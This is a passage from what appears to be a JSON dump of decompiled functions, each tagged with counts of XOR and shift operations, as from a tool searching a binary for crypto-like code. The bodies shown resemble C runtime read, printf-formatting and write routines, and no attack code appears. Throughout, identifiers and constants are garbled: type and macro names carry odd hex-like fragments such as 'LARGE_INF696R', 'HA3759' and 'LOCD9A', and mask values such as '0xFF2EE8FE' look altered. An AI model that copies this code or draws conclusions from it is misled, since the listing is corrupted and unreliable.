Buffer;\n                }\n                continue;\n              }\n              if ( v34 == lpMultiByteStr && Buffer == 10 )\n              {\n                *v34++ = 10;\n              }\n              else\n              {\n                _lseeki64_nolock(FileHandle, (LARGE_INF696R)-1i64, 1u);\n                v30 = v65;\n                if ( Buffer != 10 )\n                {\n                  *v34 = 13;\n                  goto LABEL_76;\n                }\n              }\n            }\n            else\n            {\n              if ( v35[1] == 10 )\n              {\n                v35 += 2;\n                *v34 = 10;\nLABEL_76:\n                ++v34;\n                continue;\n              }\n              *v34++ = 13;\n              ++v35;\n            }\n          }\n          else\n          {\n            *v34++ = v36;\n            ++v35;\n          }\n        }\n        while ( v35 < lpBuffer );\n      }\n      v28 = (CHAR *)lpMultiByteStr;\n      v4 = v34 - lpMultiByteStr;\n      if ( nNumberOfBytesToRead_3 != 1 || !v4 )\n      {\nLABEL_104:\n        v27 = v62;\n        goto LABEL_105;\n      }\n      v39 = v34 - 1;\n      if ( *v39 < 0 )\n      {\n        v40 = 1;\n        if ( !byte_3529D820[(unsigned __int8)*v39] )\n        {\n          do\n          {\n            if ( v40 > 4 )\n              break;\n            if ( v39 < lpMultiByteStr )\n              break;\n            --v39;\n            ++v40;\n          }\n          while ( !byte_3529D820[(unsigned __int8)*v39] );\n          v7 = (FileHandle & 0x1F) << 6;\n        }\n        if ( !byte_3529D820[(unsigned __int8)*v39] )\n        {\n          *_errno() = 42;\n          goto LABEL_40;\n        }\n        if ( byte_3529D820[(unsigned __int8)*v39] + 1 == v40 )\n        {\n          v39 += v40;\n        }\n        else\n        {\n          v41 = dword_35099EF0[v65];\n          if ( (*(_BYTE *)(v41 + v7 + 4) & 0x48) != 0 )\n          {\n            v42 = *v39;\n            v43 = v39 + 1;\n            *(_BYTE *)(v41 + v7 + 5) = v42;\n            v44 = v65;\n            if ( v40 >= 2 )\n            {\n              *(_BYTE *)(dword_35099EF0[v65] + v7 + 37) = *v43;\n              v44 = v65;\n              ++v43;\n            }\n            if ( v40 == 3 )\n              *(_BYTE *)(dword_35099EF0[v44] + v7 + 38) = *v43++;\n            v39 = &v43[-v40];\n          }\n          else\n          {\n            _lseeki64_nolock(FileHandle, (LARGE_INF696R)-v40, 1u);\n          }\n        }\n      }\n      else\n      {\n        ++v39;\n      }\n      v45 = v39 - lpMultiByteStr;\n      v4 = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, v45, (LPD8C0)lpWideCharStr, nNumberOfBytesToRead >> 1);\n      if ( !v4 )\n        goto LABEL_38;\n      v46 = v4 != v45;\n      v4 *= 2;\n      *(_DWORD *)(dword_35099EF0[v65] + v7 + 48) = v46;\nLABEL_103:\n      v28 = (CHAR *)lpMultiByteStr;\n      goto LABEL_104;\n    }\n    if ( Mode )\n    {\n      v48 = (CHAR *)lpMultiByteStr;\n      v49 = lpMultiByteStr;\n      v50 = &lpMultiByteStr[2 * (v4 / 2)];\n      if ( lpMultiByteStr < v50 )\n      {\n        while ( 1 )\n        {\n          v51 = *(_WORD *)v49;\n          if ( *(_WORD *)v49 == 26 )\n            break;\n          if ( v51 == 13 )\n          {\n            if ( v49 < v50 - 2 )\n            {\n              v49 += 2;\n              v52 = 10;\n              if ( *(_WORD *)v49 != 10 )\n                v52 = 13;\n              *(_WORD *)v48 = v52;\n              v48 += 2;\n            }\n          }\n          else\n          {\n            *(_WORD *)v48 = v51;\n            v48 += 2;\n            v49 += 2;\n          }\n          if ( v49 >= v50 )\n            goto LABEL_122;\n        }\n        *(_BYTE *)(dword_35099EF0[v65] + v7 + 4) |= 2u;\n      }\nLABEL_122:\n      v28 = (CHAR *)lpMultiByteStr;\n      v4 = (v48 - lpMultiByteStr) & 0xFF2EE8FE;\n      goto LABEL_104;\n    }\n    if ( v29 && (v30 = v65, *(_WORD *)lpMultiByteStr == 10) )\n      v53 = v32 | 4;\n    else\n      v53 = v32 & 0xFB;\n    *(_BYTE *)(v31 + v7 + 4) = v53;\n    v54 = (CHAR *)lpMultiByteStr;\n    Mode = (DWORD)&lpMultiByteStr[v4];\n    if ( lpMultiByteStr >= &lpMultiByteStr[v4] )\n    {\nLABEL_156:\n      v28 = (CHAR *)lpMultiByteStr;\n      v4 = v54 - lpMultiByteStr;\n      goto LABEL_104;\n    }\n    v55 = lpMultiByteStr;\n    while ( 1 )\n    {\n      v56 = *(_WORD *)v55;\n      if ( *(_WORD *)v55 == 26 )\n      {\n        v57 = dword_35099EF0[v30];\n        v58 = *(_BYTE *)(v57 + v7 + 4);\n        if ( (v58 & 0x40) != 0 )\n        {\n          *(_WORD *)v54 = *(_WORD *)v55;\n          v54 += 2;\n        }\n        else\n        {\n          *(_BYTE *)(v57 + v7 + 4) = v58 | 2;\n        }\n        goto LABEL_156;\n      }\n      if ( v56 != 13 )\n        break;\n      if ( (unsigned int)v55 < Mode - 2 )\n      {\n        v30 = v65;\n        if ( *((_WORD *)v55 + 1) == 10 )\n        {\n          v55 += 4;\n          *(_WORD *)v54 = 10;\nLABEL_151:\n          v54 += 2;\n          goto LABEL_144;\n        }\n        *(_WORD *)v54 = 13;\n        goto LABEL_136;\n      }\n      v55 += 2;\n      if ( !ReadFile(*(HA3759 *)(dword_35099EF0[v30] + ((FileHandle & 0x1F) << 6)), &v66, 2u, &NumberOfCharsRead, 0)\n        && GetLastError()\n        || !NumberOfCharsRead )\n      {\n        v30 = v65;\n        *(_WORD *)v54 = 13;\n        v54 += 2;\n        goto LABEL_144;\n      }\n      v30 = v65;\n      if ( (*(_BYTE *)(dword_35099EF0[v65] + v7 + 4) & 0x48) != 0 )\n      {\n        if ( v66 == 10 )\n        {\n          *(_WORD *)v54 = 10;\n          v54 += 2;\n        }\n        else\n        {\n          *(_WORD *)v54 = 13;\n          *(_BYTE *)(dword_35099EF0[v30] + v7 + 5) = v66;\n          *(_BYTE *)(dword_35099EF0[v30] + v7 + 37) = HIA0FA(v66);\n          v54 += 2;\n          *(_BYTE *)(dword_35099EF0[v30] + v7 + 38) = 10;\n        }\n        goto LABEL_144;\n      }\n      if ( v54 == lpMultiByteStr && v66 == 10 )\n      {\n        *(_WORD *)v54 = 10;\n        v54 += 2;\n      }\n      else\n      {\n        _lseeki64_nolock(FileHandle, (LARGE_INF696R)-2i64, 1u);\n        v30 = v65;\n        if ( v66 != 10 )\n        {\n          *(_WORD *)v54 = 13;\n          goto LABEL_151;\n        }\n      }\nLABEL_144:\n      if ( (unsigned int)v55 >= Mode )\n        goto LABEL_156;\n    }\n    *(_WORD *)v54 = v56;\nLABEL_136:\n    v54 += 2;\n    v55 += 2;\n    goto LABEL_144;\n  }\nLABEL_38:\n  LastError = GetLastError();\nLABEL_39:\n  _dosmaperr(LastError);\nLABEL_40:\n  v27 = -1;\nLABEL_41:\n  v28 = (CHAR *)lpMultiByteStr;\nLABEL_105:\n  if ( v28 != lpWideCharStr )\n    free(v28);\n  if ( v27 != -2 )\n    return v27;\n  return v4;\n}\n// 35495921: variable 'v12' is possibly undefined\n// 3559E6C5: using guessed type _DWORD __cdecl _dosmaperr(_DWORD);\n// 35099EF0: using guessed type int dword_35099EF0[64];\n// 35E83660: using guessed type int dword_35E83660;\n\n"
    },
    {
        "Function": "sub_355597B3",
        "Total XOR and shift operations": 9,
        "XOR operations": 0,
        "Shift operations": 9,
        "Operation percentage": "1.30%",
        "Function Body": "\nint __cdecl sub_355597B3(FILE *a1, char *a2, struct localeinfo_struct *a3, int *a4)\n{\n  unsigned int v4; // ebx\n  int v5; // eax\n  _BYTE *v6; // edx\n  char *v7; // ecx\n  char v8; // cl\n  int v9; // edx\n  char *v10; // esi\n  char *v11; // eax\n  int v12; // eax\n  int v13; // edi\n  int v14; // eax\n  char v15; // al\n  int v16; // eax\n  int v17; // ecx\n  char *j; // eax\n  int v19; // eax\n  _DWORD *v20; // edi\n  __int16 *v21; // eax\n  _WORD *v22; // edi\n  int v23; // ecx\n  int v24; // edi\n  int v25; // edi\n  void *v26; // eax\n  int v27; // eax\n  int *v28; // edi\n  void (__cdecl *v29)(int *, char *, int, int, int, int, __crt_locale_pointers *); // eax\n  void (__cdecl *v30)(char *, __crt_locale_pointers *); // eax\n  void (__cdecl *v31)(char *, __crt_locale_pointers *); // eax\n  _DWORD *v32; // edi\n  int v33; // eax\n  int v34; // edx\n  char *i; // esi\n  unsigned __int64 v36; // rcx\n  int v37; // ecx\n  char *v38; // eax\n  char *k; // eax\n  int v40; // eax\n  int v41; // edi\n  int v42; // eax\n  wchar_t *v43; // ecx\n  int result; // eax\n  int v45; // [esp-14h] [ebp-2A0h]\n  int v46; // [esp-10h] [ebp-29Ch]\n  unsigned __int64 v47; // [esp-10h] [ebp-29Ch]\n  int v48; // [esp-Ch] [ebp-298h]\n  int v49; // [esp-8h] [ebp-294h]\n  int v50; // [esp-4h] [ebp-290h]\n  wchar_t v51; // [esp-4h] [ebp-290h]\n  int v52[2]; // [esp+Ch] [ebp-280h] BYREF\n  __crt_locale_pointers Locale; // [esp+14h] [ebp-278h] BYREF\n  int v54; // [esp+1Ch] [ebp-270h]\n  char v55; // [esp+20h] [ebp-26Ch]\n  int v56; // [esp+28h] [ebp-264h]\n  int v57; // [esp+2Ch] [ebp-260h]\n  int v58; // [esp+30h] [ebp-25Ch] BYREF\n  void *Block; // [esp+34h] [ebp-258h]\n  int v60; // [esp+38h] [ebp-254h]\n  int v61; // [esp+3Ch] [ebp-250h]\n  char v62[4]; // [esp+40h] [ebp-24Ch]\n  int v63; // [esp+44h] [ebp-248h]\n  int v64; // [esp+48h] [ebp-244h]\n  int v65; // [esp+4Ch] [ebp-240h]\n  int v66; // [esp+50h] [ebp-23Ch]\n  int v67; // [esp+54h] [ebp-238h]\n  int v68; // [esp+58h] [ebp-234h]\n  FILE *Stream; // [esp+5Ch] [ebp-230h]\n  int v70; // [esp+60h] [ebp-22Ch] BYREF\n  int v71; // [esp+64h] [ebp-228h]\n  int SizeConverted; // [esp+68h] [ebp-224h] BYREF\n  int v73; // [esp+6Ch] [ebp-220h] BYREF\n  int *v74; // [esp+70h] [ebp-21Ch]\n  unsigned int v75; // [esp+74h] [ebp-218h]\n  char v76; // [esp+7Bh] [ebp-211h]\n  char *v77; // [esp+7Ch] [ebp-210h]\n  char MbCh[511]; // [esp+80h] [ebp-20Ch] BYREF\n  char v79; // [esp+27Fh] [ebp-Dh] BYREF\n  char v80[8]; // [esp+280h] [ebp-Ch] BYREF\n\n  Stream = a1;\n  v4 = 0;\n  v77 = a2;\n  v74 = a4;\n  v61 = 0;\n  v75 = 0;\n  v67 = 0;\n  v71 = 0;\n  v68 = 0;\n  v63 = 0;\n  v66 = 0;\n  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&Locale, a3);\n  v60 = (int)_errno();\n  if ( Stream\n    && ((Stream->_flag & 0x40) != 0\n     || ((v5 = _fileno(Stream), v5 == -1) || v5 == -2\n       ? (v6 = &unk_35355D30)\n       : (v6 = (_BYTE *)(dword_35099EF0[v5 >> 5] + ((v5 & 0x1F) << 6))),\n         (v6[36] & 0x7F) == 0\n      && (v5 == -1 || v5 == -2\n        ? (v7 = (char *)&unk_35355D30)\n        : (v7 = (char *)(dword_35099EF0[v5 >> 5] + ((v5 & 0x1F) << 6))),\n          v7[36] >= 0)))\n    && a2 )\n  {\n    v8 = *a2;\n    v9 = 0;\n    v73 = 0;\n    SizeConverted = 0;\n    v64 = 0;\n    Block = 0;\n    v76 = v8;\n    v62[0] = v8;\n    if ( v8 )\n    {\n      v10 = (char *)v56;\n      v11 = v77;\n      while ( 2 )\n      {\n        v77 = v11 + 1;\n        if ( v9 < 0 )\n          break;\n        if ( (unsigned __int8)(v8 - 32) > 0x58u )\n          v12 = 0;\n        else\n          v12 = *((_BYTE *)&dbl_35FF8EB0 + v8) & 0xF;\n        v13 = (int)v74;\n        v64 = byte_35FF8ED0[8 * v12 + v64] >> 4;\n        switch ( v64 )\n        {\n          case 0:\n            goto LABEL_65;\n          case 1:\n            v71 = -1;\n            v4 = 0;\n            v57 = 0;\n            v63 = 0;\n            v67 = 0;\n            v68 = 0;\n            v75 = 0;\n            v66 = 0;\n            goto LABEL_220;\n          case 2:\n            switch ( v8 )\n            {\n              case ' ':\n                v4 |= 2u;\n                goto LABEL_30;\n              case '#':\n                v4 |= 0x80u;\n                goto LABEL_30;\n              case '+':\n                v4 |= 1u;\n                goto LABEL_30;\n              case '-':\n                v4 |= 4u;\n                goto LABEL_30;\n            }\n            v11 = v77;\n            if ( v8 != 48 )\n              goto LABEL_221;\n            v4 |= 8u;\n            goto LABEL_28;\n          case 3:\n            if ( v8 == 42 )\n            {\n              v14 = *v74++;\n              v67 = v14;\n              if ( v14 < 0 )\n              {\n                v4 |= 4u;\n                v75 = v4;\n                v67 = -v14;\n              }\n            }\n            else\n            {\n              v67 *= 10;\n              v67 = v8 + v67 - 48;\n            }\n            goto LABEL_220;\n          case 4:\n            v71 = 0;\n            goto LABEL_220;\n          case 5:\n            if ( v8 != 42 )\n            {\n              v71 = v8 + 10 * v71 - 48;\n              goto LABEL_219;\n            }\n            v71 = *v74;\n            v11 = v77;\n            ++v74;\n            if ( v71 < 0 )\n              v71 = -1;\n            goto LABEL_221;\n          case 6:\n            if ( v8 == 73 )\n            {\n              v15 = *v77;\n              if ( *v77 == 54 && v77[1] == 52 )\n              {\n                v11 = v77 + 2;\n                v4 |= 0x8000u;\n                goto LABEL_28;\n              }\n              if ( v15 == 51 && v77[1] == 50 )\n              {\n                v11 = v77 + 2;\n                v4 &= ~0x8000u;\n                goto LABEL_28;\n              }\n              if ( v15 == 100 || v15 == 105 || v15 == 111 || v15 == 117 || v15 == 120 || v15 == 88 )\n                goto LABEL_220;\n              v64 = 0;\nLABEL_65:\n              v66 = 0;\n              if ( _isleadbyte_l((unsigned __int8)v8, &Locale) )\n              {\n                write_char(v62[0], Stream, (int)&v73);\n                v62[0] = *v77++;\n                if ( !v62[0] )\n                  goto LABEL_226;\n              }\n              write_char(v62[0], Stream, (int)&v73);\nLABEL_219:\n              v9 = v73;\nLABEL_220:\n              v11 = v77;\n              goto LABEL_221;\n            }\n            if ( v8 == 104 )\n            {\n              v4 |= 0x20u;\nLABEL_30:\n              v75 = v4;\n              goto LABEL_220;\n            }\n            v11 = v77;\n            if ( v8 == 108 )\n            {\n              if ( *v77 == 108 )\n              {\n                v11 = v77 + 1;\n                v4 |= 0x1000u;\n              }\n              else\n              {\n                v4 |= 0x10u;\n              }\n              goto LABEL_28;\n            }\n            if ( v8 == 119 )\n            {\n              v4 |= 0x800u;\nLABEL_28:\n              v75 = v4;\n            }\nLABEL_221:\n            v8 = *v11;\n            v76 = v8;\n            v62[0] = v8;\n            if ( !v8 )\n              break;\n            continue;\n          case 7:\n            if ( v8 > 100 )\n            {\n              if ( v8 > 112 )\n              {\n                if ( v8 == 115 )\n                  goto LABEL_83;\n                if ( v8 != 117 )\n                {\n                  if ( v8 != 120 )\n                    goto LABEL_189;\n                  v50 = 39;\n                  goto LABEL_150;\n                }\nLABEL_123:\n                SizeConverted = 10;\n                goto LABEL_124;\n              }\n              if ( v8 == 112 )\n              {\n                v71 = 8;\nLABEL_145:\n                v50 = 7;\nLABEL_150:\n                v61 = v50;\n                SizeConverted = 16;\n                if ( (v4 & 0x80u) != 0 )\n                {\n                  LOCD9A(v70) = 48;\n                  BYTE1(v70) = v50 + 81;\n                  v68 = 2;\n                }\n                goto LABEL_124;\n              }\n              if ( v8 < 101 )\n                goto LABEL_189;\n              if ( v8 <= 103 )\n                goto LABEL_77;\n              if ( v8 != 105 )\n              {\n                if ( v8 == 110 )\n                {\n                  ++v74;\n                  v22 = *(_WORD **)v13;\n                  if ( !_get_printf_count_output() )\n                    goto LABEL_226;\n                  if ( (v4 & 0x20) != 0 )\n                    *v22 = v73;\n                  else\n                    *(_DWORD *)v22 = v73;\n                  v63 = 1;\n                  goto LABEL_216;\n                }\n                if ( v8 != 111 )\n                  goto LABEL_189;\n                SizeConverted = 8;\n                if ( (v4 & 0x80u) != 0 )\n                {\n                  v4 |= 0x200u;\n                  v75 = v4;\n                }\nLABEL_124:\n                if ( (v4 & 0x8000) != 0 || (v4 & 0x1000) != 0 )\n                {\n                  v23 = *v74;\n                  v74 += 2;\n                  v24 = *(_DWORD *)(v13 + 4);\n                  goto LABEL_160;\n                }\n                v32 = ++v74;\n                if ( (v4 & 0x20) != 0 )\n                {\n                  if ( (v4 & 0x40) != 0 )\n                    v33 = *((__int16 *)v32 - 2);\n                  else\n                    v33 = *((unsigned __int16 *)v32 - 2);\n                }\n                else\n                {\n                  if ( (v4 & 0x40) == 0 )\n                  {\n                    v23 = *(v32 - 1);\n                    v24 = 0;\nLABEL_160:\n                    if ( (v4 & 0x40) != 0 && v24 < 0 )\n                    {\n                      v23 = -v23;\n                      v24 = (unsigned __int64)-__SPAC7DE__(v24, v23) >> 32;\n                      v4 |= 0x100u;\n                      v75 = v4;\n                    }\n                    if ( (v4 & 0x9000) == 0 )\n                      v24 = 0;\n                    v34 = v71;\n                    if ( v71 >= 0 )\n                    {\n                      v75 = v4 & 0xFF2EE8F7;\n                      if ( v71 > 512 )\n                        v34 = 512;\n                    }\n                    else\n                    {\n                      v34 = 1;\n                    }\n                    if ( !(v24 | v23) )\n                      v68 = 0;\n                    for ( i = &v79; ; --i )\n                    {\n                      v71 = v34 - 1;\n                      if ( v34 <= 0 && !(v24 | v23) )\n                        break;\n                      v47 = __PAC7DE__(v24, v23);\n                      v36 = __PAC7DE__(v24, v23) % SizeConverted;\n                      v37 = v36 + 48;\n                      v56 = HI475BD(v36);\n                      v24 = (v47 / SizeConverted) >> 32;\n                      v65 = v47 / SizeConverted;\n                      if ( v37 > 57 )\n                        LOCD9A(v37) = v61 + v37;\n                      v34 = v71;\n                      *i = v37;\n                      v23 = v65;\n                    }\n                    v4 = v75;\n                    v38 = (char *)(&v79 - i);\n                    v10 = i + 1;\n                    SizeConverted = (int)v38;\n                    if ( (v75 & 0x200) != 0 && (!v38 || *v10 != 48) )\n                    {\n                      --v10;\n                      ++SizeConverted;\n                      *v10 = 48;\n                    }\n                    goto LABEL_189;\n                  }\n                  v33 = *(v32 - 1);\n                }\n                v24 = v33 >> 31;\n                v23 = v33;\n                goto LABEL_160;\n              }\n            }\n            else if ( v8 != 100 )\n            {\n              if ( v8 <= 83 )\n              {\n                if ( v8 != 83 )\n                {\n                  if ( v8 == 65 )\n                  {\nLABEL_76:\n                    v8 += 32;\n                    v57 = 1;\n                    v76 = v8;\n                    goto LABEL_77;\n                  }\n                  if ( v8 != 67 )\n                  {\n                    if ( v8 == 69 || v8 == 71 )\n                      goto LABEL_76;\nLABEL_189:\n                    if ( v63 )\n                      goto LABEL_216;\n                    if ( (v4 & 0x40) == 0 )\n                      goto LABEL_198;\n                    if ( (v4 & 0x100) != 0 )\n                    {\n                      LOCD9A(v70) = 45;\n                    }\n                    else if ( (v4 & 1) != 0 )\n                    {\n                      LOCD9A(v70) = 43;\n                    }\n                    else\n                    {\n                      if ( (v4 & 2) == 0 )\n                      {\nLABEL_198:\n                        v40 = v68;\n                        v41 = v67 - SizeConverted - v68;\n                        if ( (v4 & 0xC) == 0 )\n                        {\n                          write_multi_char(32, v67 - SizeConverted - v68, Stream, (int)&v73);\n                          v40 = v68;\n                        }\n                        write_string((int)&v70, v40, Stream, (int)&v73, v60);\n                        if ( (v4 & 8) != 0 && (v4 & 4) == 0 )\n                          write_multi_char(48, v41, Stream, (int)&v73);\n                        v42 = SizeConverted;\n                        if ( v66 && SizeConverted > 0 )\n                        {\n                          v43 = (wchar_t *)v10;\n                          while ( 1 )\n                          {\n                            v65 = v42 - 1;\n                            v51 = *v43;\n                            v56 = (int)(v43 + 1);\n                            if ( wctomb_s(&v58, v80, 6u, v51) || !v58 )\n                              break;\n                            write_string((int)v80, v58, Stream, (int)&v73, v60);\n                            v42 = v65;\n                            v43 = (wchar_t *)v56;\n                            if ( !v65 )\n                              goto LABEL_212;\n                          }\n                          v9 = -1;\n                          v73 = -1;\n                        }\n                        else\n                        {\n                          write_string((int)v10, SizeConverted, Stream, (int)&v73, v60);\nLABEL_212:\n                          v9 = v73;\n                        }\n                        if ( v9 >= 0 && (v4 & 4) != 0 )\n                        {\n                          write_multi_char(32, v41, Stream, (int)&v73);\nLABEL_216:\n                          v9 = v73;\n                        }\n                        if ( !Block )\n                          goto LABEL_220;\n                        free(Block);\n                        Block = 0;\n                        goto LABEL_219;\n                      }\n                      LOCD9A(v70) = 32;\n                    }\n                    v68 = 1;\n                    goto LABEL_198;\n                  }\n                  if ( (v4 & 0x830) == 0 )\n                  {\n                    v4 |= 0x800u;\n                    v75 = v4;\n                  }\nLABEL_96:\n                  v20 = ++v74;\n                  if ( (v4 & 0x810) != 0 )\n                  {\n                    if ( wctomb_s(&SizeConverted, MbCh, 0x200u, *((_WORD *)v20 - 2)) )\n                      v63 = 1;\n                  }\n                  else\n                  {\n                    MbCh[0] = *((_BYTE *)v20 - 4);\n                    SizeConverted = 1;\n                  }\n                  v10 = MbCh;\n                  goto LABEL_189;\n                }\n                if ( (v4 & 0x830) == 0 )\n                {\n                  v4 |= 0x800u;\n                  v75 = v4;\n                }\nLABEL_83:\n                v17 = 0x7FF2EE8F;\n                if ( v71 != -1 )\n                  v17 = v71;\n                v10 = (char *)*v74++;\n                if ( (v4 & 0x810) != 0 )\n                {\n                  if ( !v10 )\n                    v10 = (char *)off_35355D78;\n                  v66 = 1;\n                  for ( j = v10; v17; j += 2 )\n                  {\n                    --v17;\n                    if ( !*(_WORD *)j )\n                      break;\n                  }\n                  v19 = (j - v10) >> 1;\n                }\n                else\n                {\n                  if ( !v10 )\n                    v10 = Str;\n                  for ( k = v10; v17; ++k )\n                  {\n                    --v17;\n                    if ( !*k )\n                      break;\n                  }\n                  v19 = k - v10;\n                }\n                goto LABEL_188;\n              }\n              if ( v8 != 88 )\n              {\n                if ( v8 == 90 )\n                {\n                  v21 = (__int16 *)*v74++;\n                  if ( v21 )\n                  {\n                    v10 = (char *)*((_DWORD *)v21 + 1);\n                    if ( v10 )\n                    {\n                      v19 = *v21;\n                      if ( (v4 & 0x800) != 0 )\n                      {\n                        v19 /= 2;\n                        v66 = 1;\n                      }\n                      else\n                      {\n                        v66 = 0;\n                      }\n                      goto LABEL_188;\n                    }\n                  }\n                  v10 = Str;\nLABEL_107:\n                  v19 = strlen(v10);\nLABEL_188:\n                  SizeConverted = v19;\n                  goto LABEL_189;\n                }\n                if ( v8 == 97 )\n                {\nLABEL_77:\n                  v16 = v71;\n                  v4 |= 0x40u;\n                  v75 = v4;\n                  v10 = MbCh;\n                  v65 = 512;\n                  if ( v71 >= 0 )\n                  {\n                    if ( v71 )\n                    {\n                      if ( v71 > 512 )\n                      {\n                        v16 = 512;\n                        v71 = 512;\n                      }\n                      if ( v16 > 163 )\n                      {\n                        v25 = v16 + 349;\n                        v26 = (void *)_malloc_crt(v16 + 349);\n                        v8 = v76;\n                        Block = v26;\n                        if ( v26 )\n                        {\n                          v10 = (char *)v26;\n                          v65 = v25;\n                        }\n                        else\n                        {\n                          v71 = 163;\n                        }\n                        v13 = (int)v74;\n                      }\n                    }\n                    else\n                    {\n                      v71 = v8 == 103;\n                    }\n                  }\n                  else\n                  {\n                    v71 = 6;\n                  }\n                  v27 = *(_DWORD *)v13;\n                  v28 = (int *)(v13 + 8);\n                  v52[0] = v27;\n                  v52[1] = *(v28 - 1);\n                  v49 = v57;\n                  v48 = v71;\n                  v74 = v28;\n                  v46 = v8;\n                  v45 = v65;\n                  v29 = (void (__cdecl *)(int *, char *, int, int, int, int, __crt_locale_pointers *))DecodePointer(off_35D55D30);\n                  v29(v52, v10, v45, v46, v48, v49, &Locale);\n                  if ( (v4 & 0x80) != 0 && !v71 )\n                  {\n                    v30 = (void (__cdecl *)(char *, __crt_locale_pointers *))DecodePointer(off_35D55D3C);\n                    v30(v10, &Locale);\n                  }\n                  if ( v76 == 103 && (v4 & 0x80) == 0 )\n                  {\n                    v31 = (void (__cdecl *)(char *, __crt_locale_pointers *))DecodePointer(off_35D55D38);\n                    v31(v10, &Locale);\n                  }\n                  if ( *v10 == 45 )\n                  {\n                    v4 |= 0x100u;\n                    v75 = v4;\n                    ++v10;\n                  }\n                  goto LABEL_107;\n                }\n                if ( v8 != 99 )\n                  goto LABEL_189;\n                goto LABEL_96;\n              }\n              goto LABEL_145;\n            }\n            v4 |= 0x40u;\n            v75 = v4;\n            goto LABEL_123;\n          default:\n            goto LABEL_220;\n        }\n        break;\n      }\n    }\n    result = v9;\n  }\n  else\n  {\nLABEL_226:\n    *_errno() = 22;\n    _invalid_parameter_noinfo();\n    result = -1;\n  }\n  if ( v55 )\n    *(_DWORD *)(v54 + 112) &= ~2u;\n  return result;\n}\n// 35FF8EB0: using guessed type double dbl_35FF8EB0;\n// 35355D78: using guessed type wchar_t *off_35355D78;\n// 35099EF0: using guessed type int dword_35099EF0[64];\n\n"
    },
    {
        "Function": "sub_35258D66",
        "Total XOR and shift operations": 4,
        "XOR operations": 0,
        "Shift operations": 4,
        "Operation percentage": "0.96%",
        "Function Body": "\nint __cdecl sub_35258D66(int a1, const void *a2, DWORD nNumberOfBytesToWrite)\n{\n  int v3; // eax\n  DWORD v4; // edi\n  int v6; // esi\n  int v7; // ecx\n  char v8; // bl\n  int v9; // eax\n  UINT ConsoleCP; // eax\n  char *v11; // ecx\n  unsigned int v12; // eax\n  CHAR v13; // cl\n  int v14; // edx\n  int v15; // eax\n  char *v16; // eax\n  int v17; // eax\n  bool v18; // zf\n  int v19; // ebx\n  int v20; // esi\n  int v21; // eax\n  _BYTE *v22; // edx\n  _BYTE *v23; // eax\n  DWORD v24; // eax\n  char *v25; // edx\n  char *v26; // ebx\n  int v27; // ecx\n  signed int v28; // ebx\n  char *v29; // ecx\n  int v30; // edi\n  DWORD v31; // eax\n  unsigned int v32; // edx\n  char *v33; // ebx\n  __int16 v34; // si\n  signed int v35; // ebx\n  BOOL v36; // eax\n  WCHAR *v37; // esi\n  DWORD v38; // ecx\n  unsigned int v39; // edx\n  WCHAR *v40; // eax\n  WCHAR v41; // di\n  char *v42; // eax\n  signed int v43; // ecx\n  DWORD LastError; // eax\n  void *v45; // [esp-10h] [ebp-1B04h]\n  UINT CodePage; // [esp+4h] [ebp-1AF0h]\n  int v47; // [esp+8h] [ebp-1AECh]\n  DWORD Mode; // [esp+10h] [ebp-1AE4h] BYREF\n  char v49; // [esp+17h] [ebp-1ADDh]\n  DWORD NumberOfBytesWritten; // [esp+18h] [ebp-1ADCh] BYREF\n  DWORD v51; // [esp+1Ch] [ebp-1AD8h] BYREF\n  int v52; // [esp+20h] [ebp-1AD4h]\n  int v53; // [esp+24h] [ebp-1AD0h]\n  char *SrcCh; // [esp+28h] [ebp-1ACCh]\n  int v55; // [esp+2Ch] [ebp-1AC8h]\n  WCHAR WideCharStr[2]; // [esp+30h] [ebp-1AC4h] BYREF\n  int FileHandle; // [esp+34h] [ebp-1AC0h]\n  LPB244D lpBuffer; // [esp+38h] [ebp-1ABCh]\n  char Buffer[1704]; // [esp+3Ch] [ebp-1AB8h] BYREF\n  CHAR v60[3416]; // [esp+6E4h] [ebp-1410h] BYREF\n  WCHAR v61[854]; // [esp+143Ch] [ebp-6B8h] BYREF\n  CHAR MultiByteStr[8]; // [esp+1AE8h] [ebp-Ch] BYREF\n\n  v3 = a1;\n  v4 = 0;\n  FileHandle = a1;\n  lpBuffer = a2;\n  *(_DWORD *)WideCharStr = 0;\n  v52 = 0;\n  if ( !nNumberOfBytesToWrite )\n    return 0;\n  if ( !a2 )\n  {\n    *__doserrno() = 0;\n    *_errno() = 22;\n    _invalid_parameter_noinfo();\n    return -1;\n  }\n  v6 = (a1 & 0x1F) << 6;\n  v53 = a1 >> 5;\n  v7 = dword_35099EF0[a1 >> 5];\n  v47 = v6;\n  v8 = (char)(2 * *(_BYTE *)(v6 + v7 + 36)) >> 1;\n  if ( v8 == 2 || v8 == 1 )\n  {\n    if ( (nNumberOfBytesToWrite & 1) != 0 )\n    {\n      *__doserrno() = 0;\n      *_errno() = 22;\n      _invalid_parameter_noinfo();\n      return -1;\n    }\n    v3 = FileHandle;\n  }\n  if ( (*(_BYTE *)(v6 + v7 + 4) & 0x20) != 0 )\n    _lseeki64_nolock(v3, 0i64, 2u);\n  if ( !_isatty(FileHandle)\n    || *(char *)(v6 + dword_35099EF0[v53] + 4) >= 0\n    || (v9 = _getptd(),\n        v45 = *(void **)(v6 + dword_35099EF0[v53]),\n        FileHandle = *(_DWORD *)(*(_DWORD *)(v9 + 108) + 168) == 0,\n        !GetConsoleMode(v45, &Mode))\n    || FileHandle && !v8 )\n  {\n    v21 = dword_35099EF0[v53];\n    if ( *(char *)(v6 + v21 + 4) >= 0 )\n    {\n      if ( WriteFile(*(HA3759 *)(v6 + v21), lpBuffer, nNumberOfBytesToWrite, &v51, 0) )\n      {\n        v4 = v51;\n        v20 = 0;\n        goto LABEL_90;\n      }\n    }\n    else\n    {\n      v22 = lpBuffer;\n      v20 = 0;\n      v55 = 0;\n      if ( v8 )\n      {\n        v29 = (char *)lpBuffer;\n        if ( v8 == 2 )\n        {\n          FileHandle = (int)lpBuffer;\n          while ( 1 )\n          {\n            Mode = 0;\n            v30 = v52;\n            v31 = v29 - v22;\n            v32 = 0;\n            v33 = Buffer;\n            do\n            {\n              if ( v31 >= nNumberOfBytesToWrite )\n                break;\n              v34 = *(_WORD *)v29;\n              v29 += 2;\n              v31 += 2;\n              FileHandle = (int)v29;\n              if ( v34 == 10 )\n              {\n                *(_WORD *)v33 = 13;\n                v29 = (char *)FileHandle;\n                v30 += 2;\n                v33 += 2;\n                v32 += 2;\n              }\n              *(_WORD *)v33 = v34;\n              v32 += 2;\n              v33 += 2;\n            }\n            while ( v32 